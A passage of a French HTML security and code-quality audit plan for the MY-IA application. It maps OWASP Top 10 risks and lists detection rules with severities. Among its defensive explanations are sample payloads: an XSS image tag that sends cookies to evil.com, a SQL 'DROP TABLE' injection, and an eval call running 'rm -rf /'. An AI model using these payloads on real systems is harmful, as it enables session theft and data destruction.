@@ -1,0 +1,1729 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MY-IA &mdash; Plan Audit de Conformit&eacute;</title>
+    <link rel="stylesheet" href="assets/doc-style.css">
+    <style>
+        .severity-high { color: var(--danger); font-weight: bold; }
+        .severity-medium { color: var(--warning); font-weight: bold; }
+        .severity-low { color: var(--info); font-weight: bold; }
+        .metric-card { text-align: center; padding: 1.5rem; }
+        .metric-value { font-size: 2.5rem; font-weight: bold; color: var(--primary); }
+        .metric-label { font-size: 0.9rem; color: var(--gray-600); margin-top: 0.5rem; }
+        .owasp-table td:first-child { font-weight: bold; white-space: nowrap; }
+        .check-matrix th { background: var(--primary-light); color: white; font-size: 0.85rem; }
+        .check-matrix td { text-align: center; }
+        .check-yes { color: var(--success); font-weight: bold; }
+        .check-no { color: var(--danger); }
+    </style>
+</head>
+<body>
+
+<!-- ==================== HEADER ==================== -->
+<div class="header">
+    <div class="page">
+        <div class="header-icon">&#x1F6E1;&#xFE0F;</div>
+        <div>
+            <h1>Plan d'Audit de Conformit&eacute;</h1>
+            <div class="subtitle">
+                M&eacute;thodologie compl&egrave;te d'audit technique : s&eacute;curit&eacute;, architecture, qualit&eacute; et conformit&eacute;
+            </div>
+            <div class="meta">
+                <span>Version 3.0</span>
+                <span>19 f&eacute;vrier 2026</span>
+                <span>15 sections</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="page">
+
+<!-- ==================== TABLE OF CONTENTS ==================== -->
+<div class="toc" id="toc">
+    <h2>Table des mati&egrave;res</h2>
+    <div class="toc-grid">
+        <a href="#s1"><span class="toc-num">1</span> Objectifs de l'Audit</a>
+        <a href="#s2"><span class="toc-num">2</span> Cat&eacute;gories d'Audit</a>
+        <a href="#s3"><span class="toc-num">3</span> R&eacute;f&eacute;rentiel OWASP Top 10</a>
+        <a href="#s4"><span class="toc-num">4</span> R&egrave;gles de D&eacute;tection</a>
+        <a href="#s5"><span class="toc-num">5</span> Niveaux de Gravit&eacute;</a>
+        <a href="#s6"><span class="toc-num">6</span> M&eacute;triques &amp; KPIs</a>
+        <a href="#s7"><span class="toc-num">7</span> Structure des Recommandations</a>
+        <a href="#s8"><span class="toc-num">8</span> Processus de Rem&eacute;diation</a>
+        <a href="#s9"><span class="toc-num">9</span> Int&eacute;gration CI/CD</a>
+        <a href="#s10"><span class="toc-num">10</span> Conformit&eacute;s Additionnelles</a>
+        <a href="#s11"><span class="toc-num">11</span> Tests d'Audit</a>
+        <a href="#s12"><span class="toc-num">12</span> Graphiques &amp; Visualisation</a>
+        <a href="#s13"><span class="toc-num">13</span> Historique &amp; Comparaison</a>
+        <a href="#s14"><span class="toc-num">14</span> Audit des D&eacute;pendances</a>
+        <a href="#s15"><span class="toc-num">15</span> Terminologie : Collections &rarr; Biblioth&egrave;ques</a>
+    </div>
+</div>
+
+<!-- ==================== SECTION 1 ==================== -->
+<div class="section" id="s1">
+    <div class="section-header">
+        <div class="section-icon icon-blue">&#x1F3AF;</div>
+        <div><h2>Objectifs de l'Audit <span class="section-num">&mdash; Section 1</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <h3><span class="h3-dot dot-blue"></span> Pourquoi auditer ?</h3>
+    <div class="cards">
+        <div class="card">
+            <div class="card-title">&#x1F6E1;&#xFE0F; S&eacute;curit&eacute;</div>
+            <div class="card-text">
+                D&eacute;tecter les vuln&eacute;rabilit&eacute;s avant qu'elles ne soient exploit&eacute;es (injections, XSS, CSRF, etc.)
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F3D7;&#xFE0F; Qualit&eacute;</div>
+            <div class="card-text">
+                Garantir le respect des patterns architecturaux et la maintenabilit&eacute; du code
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x1F4CA; Performance</div>
+            <div class="card-text">
+                Identifier les anti-patterns qui d&eacute;gradent les performances (N+1, DOM lent)
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-title">&#x2696;&#xFE0F; Conformit&eacute;</div>
+            <div class="card-text">
+                Assurer la conformit&eacute; RGPD, accessibilit&eacute; WCAG, et bonnes pratiques i18n
+            </div>
+        </div>
+    </div>
+
+    <h3><span class="h3-dot dot-green"></span> P&eacute;rim&egrave;tre</h3>
+    <table>
+        <thead>
+            <tr><th>Composant</th><th>Technologie</th><th>Audit&eacute;</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>Backend API</td><td>FastAPI / Python</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Base de donn&eacute;es</td><td>PostgreSQL / SQLAlchemy</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Vector Store</td><td>ChromaDB</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Frontend User</td><td>Vanilla JS (UI-FRONT)</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Frontend Admin</td><td>Vanilla JS (UI-BACK)</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Composants partag&eacute;s</td><td>UI-SHARED</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Scripts shell</td><td>Bash</td><td class="check-yes">&#x2705;</td></tr>
+            <tr><td>Configuration</td><td>Docker / Nginx</td><td class="check-yes">&#x2705;</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 2 ==================== -->
+<div class="section" id="s2">
+    <div class="section-header">
+        <div class="section-icon icon-red">&#x1F50D;</div>
+        <div><h2>Cat&eacute;gories d'Audit <span class="section-num">&mdash; Section 2</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <p>L'audit couvre 5 cat&eacute;gories principales, chacune avec ses r&egrave;gles sp&eacute;cifiques :</p>
+
+    <div class="cards">
+        <div class="card" style="border-top: 4px solid var(--danger);">
+            <div class="card-title">&#x1F6E1;&#xFE0F; SECURITY &mdash; S&eacute;curit&eacute; &amp; OWASP</div>
+            <div class="card-text">
+                <ul>
+                    <li>Injections SQL (f-strings, concat&eacute;nation)</li>
+                    <li>XSS (innerHTML non s&eacute;curis&eacute;)</li>
+                    <li>CSRF (tokens manquants)</li>
+                    <li>Secrets hardcod&eacute;s</li>
+                    <li>Authentification/Autorisation</li>
+                </ul>
+            </div>
+        </div>
+        <div class="card" style="border-top: 4px solid var(--primary);">
+            <div class="card-title">&#x1F3D7;&#xFE0F; ARCH &mdash; Architecture &amp; Patterns</div>
+            <div class="card-text">
+                <ul>
+                    <li>Logique DB dans les routers</li>
+                    <li>Validation dans les services (pas routers)</li>
+                    <li>S&eacute;paration des responsabilit&eacute;s</li>
+                    <li>Imports circulaires</li>
+                    <li>Couplage fort entre modules</li>
+                </ul>
+            </div>
+        </div>
+        <div class="card" style="border-top: 4px solid var(--accent);">
+            <div class="card-title">&#x1F3A8; UI &mdash; Interface &amp; Rendu</div>
+            <div class="card-text">
+                <ul>
+                    <li>innerHTML sans Templates</li>
+                    <li>Styles inline (style="")</li>
+                    <li>SVG inline (utiliser Icons)</li>
+                    <li>DOM manipulation directe</li>
+                    <li>Event listeners non nettoy&eacute;s</li>
+                </ul>
+            </div>
+        </div>
+        <div class="card" style="border-top: 4px solid var(--warning);">
+            <div class="card-title">&#x1F514; UX &mdash; Exp&eacute;rience Utilisateur</div>
+            <div class="card-text">
+                <ul>
+                    <li>Textes non traduits (i18n)</li>
+                    <li>Toasts erreur &eacute;ph&eacute;m&egrave;res</li>
+                    <li>Feedback utilisateur manquant</li>
+                    <li>Accessibilit&eacute; (ARIA, contraste)</li>
+                    <li>Messages d'erreur g&eacute;n&eacute;riques</li>
+                </ul>
+            </div>
+        </div>
+        <div class="card" style="border-top: 4px solid var(--success);">
+            <div class="card-title">&#x267B;&#xFE0F; MAINTENANCE &mdash; DRY &amp; Nettoyage</div>
+            <div class="card-text">
+                <ul>
+                    <li>Routes API orphelines</li>
+                    <li>Code dupliqu&eacute;</li>
+                    <li>Imports inutilis&eacute;s</li>
+                    <li>Fichiers morts</li>
+                    <li>TODO/FIXME non r&eacute;solus</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ==================== SECTION 3 ==================== -->
+<div class="section" id="s3">
+    <div class="section-header">
+        <div class="section-icon icon-red">&#x1F6A8;</div>
+        <div><h2>R&eacute;f&eacute;rentiel OWASP Top 10 <span class="section-num">&mdash; Section 3</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <p>Couverture des vuln&eacute;rabilit&eacute;s OWASP Top 10 (2021) :</p>
+
+    <table class="owasp-table">
+        <thead>
+            <tr><th>OWASP</th><th>Vuln&eacute;rabilit&eacute;</th><th>D&eacute;tection</th><th>Statut</th></tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>A01</td>
+                <td>Broken Access Control</td>
+                <td>V&eacute;rification <code>Depends(get_current_admin_user)</code> sur routes admin</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A02</td>
+                <td>Cryptographic Failures</td>
+                <td>D&eacute;tection secrets hardcod&eacute;s, HTTP sans TLS</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A03</td>
+                <td>Injection (SQL, XSS)</td>
+                <td>f-strings SQL, innerHTML non sanitiz&eacute;</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A04</td>
+                <td>Insecure Design</td>
+                <td>Audit manuel (architecture review)</td>
+                <td>&#x1F7E1; Partiel</td>
+            </tr>
+            <tr>
+                <td>A05</td>
+                <td>Security Misconfiguration</td>
+                <td>Headers s&eacute;curit&eacute;, CORS, debug mode</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A06</td>
+                <td>Vulnerable Components</td>
+                <td>Audit d&eacute;pendances (pip-audit, npm audit)</td>
+                <td>&#x1F7E1; Manuel</td>
+            </tr>
+            <tr>
+                <td>A07</td>
+                <td>Auth Failures</td>
+                <td>JWT expiration, refresh tokens, rate limiting</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A08</td>
+                <td>Data Integrity Failures</td>
+                <td>V&eacute;rification signatures, checksums uploads</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A09</td>
+                <td>Logging Failures</td>
+                <td>V&eacute;rification logs s&eacute;curit&eacute;, pas de secrets logg&eacute;s</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>A10</td>
+                <td>SSRF</td>
+                <td>Validation URLs sources externes</td>
+                <td>&#x1F7E1; Partiel</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+<!-- ==================== SECTION 4 ==================== -->
+<div class="section" id="s4">
+    <div class="section-header">
+        <div class="section-icon icon-purple">&#x1F4DD;</div>
+        <div><h2>R&egrave;gles de D&eacute;tection <span class="section-num">&mdash; Section 4</span></h2></div>
+        <a href="#toc" class="back-to-toc" title="Table des mati&egrave;res">&#x2B06; Sommaire</a>
+    </div>
+
+    <p>Chaque r&egrave;gle est document&eacute;e avec son <strong>pattern de d&eacute;tection</strong>, la <strong>raison</strong> pour laquelle elle est n&eacute;cessaire, et son <strong>statut d'impl&eacute;mentation</strong>.</p>
+
+    <!-- ===== SECURITY RULES ===== -->
+    <h3><span class="h3-dot dot-red"></span> S&eacute;curit&eacute; (SECURITY)</h3>
+
+    <div class="callout callout-danger" style="margin-bottom: 1rem;">
+        <span class="callout-icon">&#x1F6A8;</span>
+        <span>Les failles de s&eacute;curit&eacute; peuvent entra&icirc;ner : <strong>vol de donn&eacute;es utilisateur</strong>, <strong>compromission du serveur</strong>, <strong>usurpation d'identit&eacute;</strong>, et <strong>responsabilit&eacute; l&eacute;gale (RGPD)</strong>.</span>
+    </div>
+
+    <table>
+        <thead><tr><th>R&egrave;gle</th><th>Pattern</th><th>Grav.</th><th>Impl.</th></tr></thead>
+        <tbody>
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">SQL Injection</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>.execute(f"</code> ou <code>.execute(' + variable</code><br>
+                    <strong>Pourquoi :</strong> Un attaquant peut injecter du SQL malveillant via les entr&eacute;es utilisateur (formulaires, URL).
+                    Cela permet de <em>lire toute la base de donn&eacute;es</em>, <em>modifier/supprimer des enregistrements</em>,
+                    ou <em>ex&eacute;cuter des commandes syst&egrave;me</em> (via xp_cmdshell sur SQL Server).<br>
+                    <strong>Exemple d'attaque :</strong> <code>'; DROP TABLE users; --</code><br>
+                    <strong>OWASP :</strong> A03:2021 - Injection
+                </td>
+            </tr>
+            <tr>
+                <td>SQL Injection (f-string)</td>
+                <td><code>.execute(f"SELECT...{var}")</code></td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+            <tr>
+                <td>SQL Injection (concat)</td>
+                <td><code>.execute("SELECT" + var)</code></td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Cross-Site Scripting (XSS)</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>.innerHTML =</code> sans <code>Templates.render</code><br>
+                    <strong>Pourquoi :</strong> L'injection de HTML/JavaScript dans une page permet &agrave; un attaquant de
+                    <em>voler les cookies/tokens JWT</em>, <em>rediriger vers des sites de phishing</em>,
+                    <em>ex&eacute;cuter des actions au nom de l'utilisateur</em> (virement, changement de mot de passe).<br>
+                    <strong>Exemple d'attaque :</strong> <code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code><br>
+                    <strong>OWASP :</strong> A03:2021 - Injection
+                </td>
+            </tr>
+            <tr>
+                <td>XSS via innerHTML</td>
+                <td><code>el.innerHTML = userInput</code></td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Secrets Hardcod&eacute;s</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>password = "..."</code>, <code>api_key = "..."</code><br>
+                    <strong>Pourquoi :</strong> Les secrets en dur dans le code sont <em>expos&eacute;s dans le d&eacute;p&ocirc;t Git</em>
+                    (m&ecirc;me apr&egrave;s suppression, ils restent dans l'historique). Un acc&egrave;s au repo = acc&egrave;s &agrave; tous les syst&egrave;mes connect&eacute;s.
+                    Les bots scannent GitHub en permanence pour trouver des cl&eacute;s AWS, tokens API, etc.<br>
+                    <strong>Cons&eacute;quence :</strong> Factures cloud de milliers d'euros, fuite de donn&eacute;es, compromission totale.<br>
+                    <strong>OWASP :</strong> A02:2021 - Cryptographic Failures
+                </td>
+            </tr>
+            <tr>
+                <td>Secrets hardcod&eacute;s</td>
+                <td><code>password|api_key|secret = "..."</code></td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Eval/Exec Dynamique</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>eval(user_input)</code>, <code>exec(data)</code><br>
+                    <strong>Pourquoi :</strong> <code>eval()</code> et <code>exec()</code> ex&eacute;cutent du code Python arbitraire.
+                    Si l'entr&eacute;e provient de l'utilisateur, il peut <em>ex&eacute;cuter n'importe quelle commande</em> sur le serveur :
+                    lire des fichiers, installer des backdoors, acc&eacute;der au r&eacute;seau interne.<br>
+                    <strong>Exemple d'attaque :</strong> <code>__import__('os').system('rm -rf /')</code><br>
+                    <strong>OWASP :</strong> A03:2021 - Injection
+                </td>
+            </tr>
+            <tr>
+                <td>Eval dynamique</td>
+                <td><code>eval(</code>, <code>exec(</code> avec variable</td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Debug Mode en Production</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>debug=True</code>, <code>DEBUG=True</code> hors tests<br>
+                    <strong>Pourquoi :</strong> Le mode debug expose des informations sensibles : <em>stack traces compl&egrave;tes</em>,
+                    <em>variables d'environnement</em>, <em>chemins fichiers</em>, <em>versions des d&eacute;pendances</em>.
+                    Ces informations facilitent les attaques cibl&eacute;es. De plus, certains frameworks (Flask, Django)
+                    activent un <em>d&eacute;bogueur interactif</em> permettant l'ex&eacute;cution de code.<br>
+                    <strong>OWASP :</strong> A05:2021 - Security Misconfiguration
+                </td>
+            </tr>
+            <tr>
+                <td>Debug mode</td>
+                <td><code>debug=True</code> hors tests</td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">CSRF (Cross-Site Request Forgery)</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Forms POST sans <code>csrf_token</code><br>
+                    <strong>Pourquoi :</strong> Sans protection CSRF, un site malveillant peut <em>soumettre des requ&ecirc;tes au nom de l'utilisateur connect&eacute;</em>.
+                    L'attaquant cr&eacute;e une page avec un formulaire cach&eacute; qui pointe vers votre application.
+                    Si l'utilisateur visite cette page alors qu'il est connect&eacute;, l'action est ex&eacute;cut&eacute;e (virement, suppression de compte...).<br>
+                    <strong>Note MY-IA :</strong> FastAPI avec JWT dans headers (pas cookies) est moins vuln&eacute;rable, mais les formulaires HTML classiques restent &agrave; risque.<br>
+                    <strong>OWASP :</strong> Anciennement Top 10, maintenant couvert par A01:2021 - Broken Access Control
+                </td>
+            </tr>
+            <tr>
+                <td>CSRF manquant</td>
+                <td>Forms POST sans token</td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Secrets dans les Logs</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>logger.info(f"Token: {token}")</code><br>
+                    <strong>Pourquoi :</strong> Les logs sont souvent <em>stock&eacute;s en clair</em>, <em>envoy&eacute;s &agrave; des services tiers</em> (Datadog, ELK),
+                    et <em>accessibles &agrave; plusieurs personnes</em> de l'&eacute;quipe. Logger un mot de passe ou token expose ce secret
+                    &agrave; quiconque a acc&egrave;s aux logs, et cr&eacute;e une trace permanente de la fuite.<br>
+                    <strong>OWASP :</strong> A09:2021 - Security Logging and Monitoring Failures
+                </td>
+            </tr>
+            <tr>
+                <td>Secrets logg&eacute;s</td>
+                <td><code>logger.*(password|token)</code></td>
+                <td class="severity-high">HIGH</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Headers de S&eacute;curit&eacute;</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Absence de CSP, X-Frame-Options, X-Content-Type-Options<br>
+                    <strong>Pourquoi :</strong> Ces headers indiquent au navigateur comment se prot&eacute;ger :<br>
+                    &bull; <strong>CSP</strong> : Bloque l'ex&eacute;cution de scripts non autoris&eacute;s (anti-XSS)<br>
+                    &bull; <strong>X-Frame-Options</strong> : Emp&ecirc;che l'int&eacute;gration en iframe (anti-clickjacking)<br>
+                    &bull; <strong>X-Content-Type-Options</strong> : Force le type MIME d&eacute;clar&eacute; (anti-MIME sniffing)<br>
+                    Sans ces headers, le navigateur applique des r&egrave;gles permissives par d&eacute;faut.<br>
+                    <strong>OWASP :</strong> A05:2021 - Security Misconfiguration
+                </td>
+            </tr>
+            <tr>
+                <td>Headers s&eacute;curit&eacute;</td>
+                <td>Absence CSP, X-Frame-Options</td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">HTTP sans TLS</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>http://</code> dans URLs (hors localhost)<br>
+                    <strong>Pourquoi :</strong> Le trafic HTTP est <em>non chiffr&eacute;</em> et peut &ecirc;tre intercept&eacute; par quiconque
+                    sur le m&ecirc;me r&eacute;seau (attaque man-in-the-middle). Mots de passe, tokens, donn&eacute;es personnelles
+                    transitent en clair. Les WiFi publics sont particuli&egrave;rement risqu&eacute;s.<br>
+                    <strong>OWASP :</strong> A02:2021 - Cryptographic Failures
+                </td>
+            </tr>
+            <tr>
+                <td>HTTP sans TLS</td>
+                <td><code>http://</code> hors localhost</td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- ===== ARCHITECTURE RULES ===== -->
+    <h3><span class="h3-dot dot-blue"></span> Architecture (ARCH)</h3>
+
+    <div class="callout callout-info" style="margin-bottom: 1rem;">
+        <span class="callout-icon">&#x1F3D7;&#xFE0F;</span>
+        <span>Les probl&egrave;mes d'architecture entra&icirc;nent : <strong>code non testable</strong>, <strong>bugs difficiles &agrave; tracer</strong>, <strong>duplication</strong>, et <strong>dette technique exponentielle</strong>.</span>
+    </div>
+
+    <table>
+        <thead><tr><th>R&egrave;gle</th><th>Pattern</th><th>Grav.</th><th>Impl.</th></tr></thead>
+        <tbody>
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Logique DB dans Router</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>db.add()</code>, <code>db.commit()</code> dans router.py<br>
+                    <strong>Pourquoi :</strong> Le router doit uniquement <em>recevoir la requ&ecirc;te</em>, <em>valider les entr&eacute;es</em>, et <em>appeler le service</em>.
+                    La logique de persistance dans le router :<br>
+                    &bull; <strong>Emp&ecirc;che les tests unitaires</strong> (n&eacute;cessite une vraie DB)<br>
+                    &bull; <strong>Duplique le code</strong> si la m&ecirc;me op&eacute;ration est utilis&eacute;e ailleurs<br>
+                    &bull; <strong>M&eacute;lange les responsabilit&eacute;s</strong> (violation du principe Single Responsibility)<br>
+                    <strong>Solution :</strong> D&eacute;placer vers <code>service.py</code> ou <code>repository.py</code>
+                </td>
+            </tr>
+            <tr>
+                <td>DB dans router</td>
+                <td><code>db.add/commit/execute</code> dans router.py</td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Import Circulaire</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Module A importe B, et B importe A<br>
+                    <strong>Pourquoi :</strong> Les imports circulaires causent :<br>
+                    &bull; <strong>ImportError</strong> au d&eacute;marrage (attribut non d&eacute;fini)<br>
+                    &bull; <strong>Comportements impr&eacute;visibles</strong> selon l'ordre d'import<br>
+                    &bull; <strong>Signal d'architecture coupl&eacute;e</strong> (modules trop d&eacute;pendants)<br>
+                    <strong>Solution :</strong> Extraire le code commun dans un troisi&egrave;me module, ou utiliser l'injection de d&eacute;pendances
+                </td>
+            </tr>
+            <tr>
+                <td>Import circulaire</td>
+                <td>Imports mutuels entre modules</td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">N+1 Queries</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Boucle avec <code>db.execute</code> ou <code>await session.get</code><br>
+                    <strong>Pourquoi :</strong> Pour N &eacute;l&eacute;ments, le code effectue N+1 requ&ecirc;tes au lieu d'une seule.
+                    Avec 100 &eacute;l&eacute;ments, c'est 100x plus de latence r&eacute;seau et de charge DB.<br>
+                    <strong>Exemple probl&egrave;me :</strong> <code>for doc in docs: author = await get_user(doc.author_id)</code><br>
+                    <strong>Solution :</strong> Utiliser <code>joinedload()</code>, <code>selectinload()</code>, ou une requ&ecirc;te avec <code>IN (:ids)</code><br>
+                    <strong>Impact :</strong> Pages lentes, timeouts, surcharge base de donn&eacute;es
+                </td>
+            </tr>
+            <tr>
+                <td>N+1 queries</td>
+                <td>Boucle + <code>db.execute</code></td>
+                <td class="severity-medium">MEDIUM</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">God Class / Fichier Trop Long</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> Fichier &gt; 500 lignes ou classe &gt; 20 m&eacute;thodes<br>
+                    <strong>Pourquoi :</strong> Un fichier trop long indique :<br>
+                    &bull; <strong>Trop de responsabilit&eacute;s</strong> (devrait &ecirc;tre d&eacute;coup&eacute;)<br>
+                    &bull; <strong>Difficult&eacute; de navigation</strong> (temps perdu &agrave; chercher)<br>
+                    &bull; <strong>Conflits Git fr&eacute;quents</strong> (plusieurs devs sur le m&ecirc;me fichier)<br>
+                    &bull; <strong>Tests complexes</strong> (setup lourd pour tester une partie)<br>
+                    <strong>Seuils :</strong> 500 lignes (warning), 1000 lignes (critique)
+                </td>
+            </tr>
+            <tr>
+                <td>God class</td>
+                <td>Fichier &gt; 500 lignes</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- ===== UI RULES ===== -->
+    <h3><span class="h3-dot dot-amber"></span> Interface (UI)</h3>
+
+    <div class="callout callout-warning" style="margin-bottom: 1rem;">
+        <span class="callout-icon">&#x1F3A8;</span>
+        <span>Les probl&egrave;mes UI entra&icirc;nent : <strong>performances d&eacute;grad&eacute;es</strong>, <strong>incoh&eacute;rence visuelle</strong>, <strong>maintenance difficile</strong>, et <strong>fuites m&eacute;moire</strong>.</span>
+    </div>
+
+    <table>
+        <thead><tr><th>R&egrave;gle</th><th>Pattern</th><th>Grav.</th><th>Impl.</th></tr></thead>
+        <tbody>
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">innerHTML sans Templates</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>.innerHTML =</code> sans <code>Templates.render()</code><br>
+                    <strong>Pourquoi :</strong> M&ecirc;me sans risque XSS (donn&eacute;es internes), innerHTML pose des probl&egrave;mes :<br>
+                    &bull; <strong>Pas d'&eacute;chappement automatique</strong> (risque si les donn&eacute;es changent)<br>
+                    &bull; <strong>Reconstruction compl&egrave;te du DOM</strong> (perte d'&eacute;tat, event listeners)<br>
+                    &bull; <strong>HTML &eacute;parpill&eacute;</strong> dans le JS (difficile &agrave; maintenir)<br>
+                    <strong>Solution :</strong> <code>Templates.render('template-name', data)</code>
+                </td>
+            </tr>
+            <tr>
+                <td>innerHTML direct</td>
+                <td><code>.innerHTML =</code> sans Templates</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-yes">&#x2705;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">Event Listeners Orphelins</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>addEventListener</code> sans <code>removeEventListener</code> correspondant<br>
+                    <strong>Pourquoi :</strong> Les listeners non supprim&eacute;s causent :<br>
+                    &bull; <strong>Fuites m&eacute;moire</strong> (l'&eacute;l&eacute;ment reste r&eacute;f&eacute;renc&eacute;)<br>
+                    &bull; <strong>Handlers dupliqu&eacute;s</strong> (si le code est r&eacute;ex&eacute;cut&eacute;)<br>
+                    &bull; <strong>Comportements impr&eacute;visibles</strong> (ancien code toujours actif)<br>
+                    <strong>Solution :</strong> Supprimer dans <code>destroy()</code> ou utiliser <code>{ once: true }</code>
+                </td>
+            </tr>
+            <tr>
+                <td>Event listener orphelin</td>
+                <td><code>addEventListener</code> sans remove</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
+            </tr>
+
+            <tr><td colspan="4" style="background: var(--gray-100); font-weight: bold;">DOM dans Boucle</td></tr>
+            <tr>
+                <td colspan="4" style="font-size: 0.9rem; padding: 0.75rem;">
+                    <strong>Pattern :</strong> <code>appendChild</code> ou <code>innerHTML +=</code> dans une boucle<br>
+                    <strong>Pourquoi :</strong> Chaque modification du DOM d&eacute;clenche un <em>reflow/repaint</em> co&ucirc;teux.
+                    Dans une boucle de 100 it&eacute;rations, c'est 100 reflows au lieu d'un seul.<br>
+                    <strong>Impact :</strong> UI qui "freeze", scrolling saccad&eacute;, mauvaise exp&eacute;rience<br>
+                    <strong>Solution :</strong> Construire le HTML en m&eacute;moire (DocumentFragment ou string), puis ins&eacute;rer une seule fois
+                </td>
+            </tr>
+            <tr>
+                <td>DOM dans boucle</td>
+                <td><code>appendChild</code> dans for/while</td>
+                <td class="severity-low">LOW</td>
+                <td class="check-no">&#x274C;</td>
